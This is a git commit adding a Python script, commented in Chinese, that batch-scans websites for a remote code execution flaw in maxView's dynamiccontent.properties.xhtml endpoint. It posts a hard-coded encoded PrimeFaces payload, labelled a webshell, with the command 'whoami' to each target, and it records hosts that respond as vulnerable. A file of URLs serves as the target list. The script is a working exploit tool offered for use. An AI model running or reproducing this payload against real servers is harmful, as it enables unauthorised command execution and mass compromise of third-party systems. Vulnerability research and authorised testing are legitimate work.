2f98d1c4d0b12766665a0d1a32245def5a2271cb
satyr1203dd <1094666459@qq.com>
2024-10-11 17:10:27 +0800

    Add files via upload

---
+++ maxView 系统 dynamiccontent.properties.xhtml 远程代码执行漏洞批量检测.py
@@ -0,0 +1,65 @@
+import sys
+import requests
+import argparse
+
+# 漏洞检测模块
+def checkVuln(url):
+    vulnurl = url + "/maxview/manager/javax.faces.resource/dynamiccontent.properties.xhtml"  #漏洞页面信息
+    data = """pfdrt=sc&ln=primefaces&pfdrid=uMKljPgnOTVxmOB%2BH6%2FQEPW9ghJMGL3PRdkfmbiiPkUDzOAoSQnmBt4dYyjvjGhVqupdmBV%2FKAe9gtw54DSQCl72JjEAsHTRvxAuJC%2B%2FIFzB8dhqyGafOLqDOqc4QwUqLOJ5KuwGRarsPnIcJJwQQ7fEGzDwgaD0Njf%2FcNrT5NsETV8ToCfDLgkzjKVoz1ghGlbYnrjgqWarDvBnuv%2BEo5hxA5sgRQcWsFs1aN0zI9h8ecWvxGVmreIAuWduuetMakDq7ccNwStDSn2W6c%2BGvDYH7pKUiyBaGv9gshhhVGunrKvtJmJf04rVOy%2BZLezLj6vK%2BpVFyKR7s8xN5Ol1tz%2FG0VTJWYtaIwJ8rcWJLtVeLnXMlEcKBqd4yAtVfQNLA5AYtNBHneYyGZKAGivVYteZzG1IiJBtuZjHlE3kaH2N2XDLcOJKfyM%2FcwqYIl9PUvfC2Xh63Wh4yCFKJZGA2W0bnzXs8jdjMQoiKZnZiqRyDqkr5PwWqW16%2FI7eog15OBl4Kco%2FVjHHu8Mzg5DOvNevzs7hejq6rdj4T4AEDVrPMQS0HaIH%2BN7wC8zMZWsCJkXkY8GDcnOjhiwhQEL0l68qrO%2BEb%2F60MLarNPqOIBhF3RWB25h3q3vyESuWGkcTjJLlYOxHVJh3VhCou7OICpx3NcTTdwaRLlw7sMIUbF%2FciVuZGssKeVT%2FgR3nyoGuEg3WdOdM5tLfIthl1ruwVeQ7FoUcFU6RhZd0TO88HRsYXfaaRyC5HiSzRNn2DpnyzBIaZ8GDmz8AtbXt57uuUPRgyhdbZjIJx%2FqFUj%2BDikXHLvbUMrMlNAqSFJpqoy%2FQywVdBmlVdx%2BvJelZEK%2BBwNF9J4p%2F1fQ8wJZL2LB9SnqxAKr5kdCs0H%2FvouGHAXJZ%2BJzx5gcCw5h6%2Fp3ZkZMnMhkPMGWYIhFyWSSQwm6zmSZh1vRKfGRYd36aiRKgf3AynLVfTvxqPzqFh8BJUZ5Mh3V9R6D%2FukinKlX99zSUlQaueU22fj2jCgzvbpYwBUpD6a6tEoModbqMSIr0r7kYpE3tWAaF0ww4INtv2zUoQCRKo5BqCZFyaXrLnj7oA6RGm7ziH6xlFrOxtRd%2BLylDFB3dcYIgZtZoaSMAV3pyNoOzHy%2B1UtHe1nL97jJUCjUEbIOUPn70hyab29iHYAf3%2B9h0aurkyJVR28jIQlF4nT0nZqpixP%2Fnc0zrGppyu8dFzMqSqhRJgIkRrETErXPQ9sl%2BzoSf6CNta5ssizanfqqCmbwcvJkAlnPCP5OJhVes7lKCMlGH%2BOwPjT2xMuT6zaTMu3UMXeTd7U8yImpSbwTLhqcbaygXt8hhGSn5Qr7UQymKkAZGNKHGBbHeBIrEdjnVphcw9L2BjmaE%2BlsjMhGqFH6XWP5GD8FeHFtuY8bz08F4Wjt5wAeUZQOI4rSTpzgssoS1vbjJGzFukA07ahU%3D&cmd=whoami"""  # Webshell
+
+    headers = {'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:105.0) Gecko/20100101 Firefox/105.0',
+               'Content-Type': 'application/x-www-form-urlencoded'
+               }
+    try:
+        response = requests.post(vulnurl, headers=headers, data=data, timeout=5, verify=False)
+        if response.status_code == 200:
+            if "system" in requests.post(vulnurl, headers=headers, data=data, timeout=5, verify=False).text:
+                print(f"【+】当前网址存在漏洞：{url}")
+                with open("loudong.txt", "a+") as f:
+                    f.write(vulnurl + "\n")
+            else:
+                print("【-】目标网站不存在漏洞...")
+
+        else:
+            print("【-】目标网站不存在漏洞...")
+    except Exception as e:
+        print("【-】目标网址存在网络链接问题...")
+
+# 批量漏洞检测模块
+def batchCheck(filename):
+    with open(filename, "r") as f:
+        for readline in f.readlines():
+            checkVuln(readline)
+
+def banner():
+    bannerinfo = """
+
+ _      ____ ___  _ _     _  _____ _            ____  ____ ___  _
+/ \__/|/  _ \\  \/// \ |\/ \/  __// \  /|      /  _ \/  __\\  \//
+| |\/||| / \| \  / | | //| ||  \  | |  ||_____ | | \||  \/| \  / 
+| |  ||| |-|| /  \ | \// | ||  /_ | |/\||\____\| |_/||  __/ /  \ 
+\_/  \|\_/ \|/__/\\\__/  \_/\____\\_/  \|      \____/\_/   /__/\\
+                                                                 
+   """
+    print(bannerinfo)
+    print("SparkShop".center(100, '*'))
+    print(f"[+]{sys.argv[0]} --url htttp://www.xxx.com 即可进行单个漏洞检测")
+    print(f"[+]{sys.argv[0]} --file *.txt 即可对选中文档中的网址进行批量检测")
+    print(f"[+]{sys.argv[0]} --help 查看更多详细帮助信息")
+    print("--author:satyr ".rjust(100," "))
+
+# 主程序方法，进行调用
+def main():
+    parser = argparse.ArgumentParser(description='maxView 系统 dynamiccontent.properties.xhtml 远程代码执行漏洞单批检测脚本@satyr')
+    parser.add_argument('-u','--url', type=str, help='单个漏洞网址')
+    parser.add_argument('-f','--file', type=str, help='批量检测文本')
+    args = parser.parse_args()
+    if args.url:
+        checkVuln(args.url)
+    elif args.file:
+        batchCheck(args.file)
+    else:
+        banner()   # 欢迎信息....
+
+if __name__ == '__main__':
+    main()
